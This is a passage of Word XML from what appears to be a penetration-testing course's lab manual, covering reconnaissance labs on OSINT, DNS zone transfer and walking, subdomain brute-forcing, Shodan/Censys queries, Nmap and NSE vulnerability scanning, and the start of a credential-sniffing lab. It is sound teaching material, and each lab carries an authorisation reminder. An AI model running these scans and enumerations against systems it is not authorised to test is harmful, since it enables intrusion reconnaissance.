        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Save theHarvester output for correlation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>theHarvester -d example.com -b crtsh,rapiddns -f example-osint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create a Recon-ng workspace and install modules</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>recon-ng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run the hackertarget hosts module on the domain</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>modules load recon/domains-hosts/hackertarget</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Chain threatcrowd and certificate_transparency feeds</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>modules load recon/domains-hosts/certificate_transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Show the combined hosts table</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>show hosts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Export an HTML report and open it in Firefox</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>modules load reporting/html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm theHarvester and Recon-ng enumerate emails and subdomains from public indexes only and produce an HTML OSINT report, with no packet sent to the target.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labs/lab-06-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 7 — WHOIS, DNS Recon and Zone Walking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Information gathering (DNS/reverse DNS) and DNS enumeration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner maps a target's DNS footprint with whois, dig, dnsenum and dnsrecon, tests for AXFR zone transfer, and walks an NSEC-signed zone to identify reportable misconfigurations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A DNS record map, a successful AXFR zone dump, and an NSEC zone walk   (Tools: whois, dig, dnsenum, dnsrecon, ldns-walk.)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Query registrar and name servers with WHOIS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>whois example.com | head -40</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Pull A, MX, NS and TXT records with dig</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>dig zonetransfer.me A; dig zonetransfer.me MX; dig zonetransfer.me NS +short; dig zonetransfer.me TXT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Perform a reverse DNS lookup on an IP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>dig -x 8.8.8.8 +short</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Attempt an AXFR zone transfer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>dig axfr @nsztm1.digi.ninja zonetransfer.me</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Automate enumeration with dnsenum</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>dnsenum --output zonetransfer.xml zonetransfer.me</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run std, axfr and brute modes with dnsrecon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>dnsrecon -d zonetransfer.me -t brt -D /usr/share/wordlists/dnsmap.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Detect DNSSEC keys with dig</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>dig zonetransfer.me +dnssec +short; dig DNSKEY zonetransfer.me +short</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Walk an NSEC-signed zone with ldns-walk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ldns-walk zonetransfer.me</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the AXFR returns the full zone and ldns-walk enumerates every NSEC record, both reportable DNS misconfigurations.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labs/lab-07-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 8 — Subdomain Enumeration with Amass and Subfinder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Enumeration (DNS enumeration, host discovery) and tools.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner enumerates subdomains from passive sources with Subfinder, Assetfinder and Amass, brute-forces with active Amass, then filters to live HTTP hosts and screenshots them.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A deduped subdomain list, a live-hosts file, and a gowitness screenshot gallery   (Tools: Amass, Subfinder, Assetfinder, httpx, gowitness.)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amass, subfinder and assetfinder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo apt update &amp;&amp; sudo apt install -y amass subfinder assetfinder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate passive sources with Subfinder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>subfinder -d owasp.org -all -silent | tee subs-subfinder.txt | wc -l</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-check subdomains with Assetfinder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>assetfinder --subs-only owasp.org | sort -u &gt; subs-assetfinder.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run OWASP Amass passive enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>amass enum -passive -d owasp.org -o subs-amass.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Combine and de-duplicate all sources</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cat subs-*.txt | sort -u &gt; subs-all.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Brute-force subdomains with active Amass</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>amass enum -active -d owasp.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o subs-active.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Probe alive HTTP/HTTPS hosts with httpx</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cat subs-all.txt | httpx -silent -status-code -title -tech-detect -o alive.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshot live hosts with gowitness</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gowitness file -f alive.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the merged subdomain list resolves to live hosts in alive.txt and gowitness produces a screenshot gallery for the report appendix.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labs/lab-08-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 9 — Shodan, Censys and Certificate Transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: OSINT via search engines and certificate transparency logs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner uses the Shodan and Censys APIs and crt.sh to enumerate a target's internet-visible assets without scanning, then merges the three sources into one deduped asset CSV.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A deduped internet-visible attack-surface CSV from three OSINT sources   (Tools: Shodan CLI, Censys CLI, crt.sh, curl, jq.)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and initialise the Shodan CLI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>pip install shodan; shodan init &lt;YOUR_API_KEY&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Search Shodan by org, hostname and vuln filters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>shodan search 'org:"OWASP"'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Download and parse Shodan results to JSON</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>shodan download owasp 'org:"OWASP"'; shodan parse --fields ip_str,port,product,version owasp.json.gz | head</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Configure and query the Censys CLI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>censys config</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Find assets by TLS common name in Censys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>censys search 'services.tls.certificates.leaf_data.subject.common_name="*.owasp.org"' --pages 1 | jq '.[] | .ip'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Extract subdomains from crt.sh CT logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -s 'https://crt.sh/?q=%25.owasp.org&amp;output=json' | jq -r '.[].name_value' | sort -u | head -20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Merge sources into a deduped asset CSV</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sort -u assets.csv &gt; assets-dedup.csv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the three OSINT sources merge into one deduped assets CSV describing the internet-visible attack surface, all gathered without scanning the target.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labs/lab-09-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 10 — Network Scanning with Nmap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Network reconnaissance and TCP/UDP protocol scanning.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner uses Nmap to sweep for live hosts, run SYN and UDP port scans, detect services and OS with version and default scripts, and export results to XML/HTML for the report.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A full TCP/UDP scan with service, OS and script data saved in all formats   (Tools: Nmap, Docker, xsltproc.)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Launch a vulnerable Docker target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name target -p 2222:22 -p 8080:80 -p 8443:443 vulhub/openssh:5.3p1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Sweep for live hosts with a ping scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -sn 192.168.1.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a fast all-ports SYN scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -sS -p- --min-rate 1000 -T4 $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan the top UDP ports</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -sU --top-ports 50 $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Detect service versions with default scripts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -sV -sC -p 22,80,443,2222,8080,8443 $TARGET -oA target-scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Fingerprint the operating system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -O $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Convert the XML scan to an HTML report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>xsltproc target-scan.xml -o target-scan.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the scan reports open ports, service versions and an OS guess, and that target-scan.html renders as a report appendix.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labs/lab-10-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 11 — Service Enumeration with Nmap NSE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Service/protocol/share enumeration with Nmap NSE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner drives the Nmap Scripting Engine to enumerate HTTP, SMB, TLS, SMTP and SNMP, cross-checks SMB with enum4linux-ng and smbclient, and runs known-vulnerability scripts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Deep NSE service enumeration with SMB shares/users and CVE findings   (Tools: Nmap NSE, enum4linux-ng, smbclient, onesixtyone, snmpwalk.)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Spin up the Metasploitable3 target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name msf3 -p 0.0.0.0:0:0 rapid7/metasploitable3-ub1404</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate HTTP with NSE scripts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -p 80,8080,8585 --script "http-title,http-headers,http-enum,http-robots.txt" $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate SMB shares, users and security mode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -p 139,445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode" $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-check SMB with enum4linux-ng and smbclient</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>enum4linux-ng -A $TARGET; smbclient -L //$TARGET/ -N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Audit SSL/TLS ciphers and Heartbleed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -p 443,8443 --script "ssl-enum-ciphers,ssl-cert,ssl-heartbleed" $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run known-vulnerability SMB and HTTP scripts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -p 445 --script "smb-vuln-ms17-010,smb-vuln-cve-2009-3103" $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate SNMP with NSE and snmpwalk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -sU -p 161 --script "snmp-info,snmp-sysdescr,snmp-interfaces" $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run the all-in-one vuln category scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo nmap -sV --script "vuln" -oA target-vuln $TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm NSE lists SMB shares/users, flags TLS misconfigurations, and prints VULNERABLE blocks for known CVEs promotable straight to the report.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labs/lab-11-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 12 — Traffic Capture and Analysis with Wireshark and tcpdump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Packet capture and traffic analysis for reconnaissance, service discovery and credential recovery.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner captures live network traffic with tcpdump and Wireshark, applies display filters to isolate protocols, follows a TCP stream end to end, recovers cleartext credentials from a capture, and extracts fields and objects from the CLI with tshark.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A pcap capture, filtered protocol views, a followed TCP stream and recovered cleartext credentials   (Tools: Wireshark, tshark, tcpdump, Kali.)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Wireshark, tshark and tcpdump on Kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
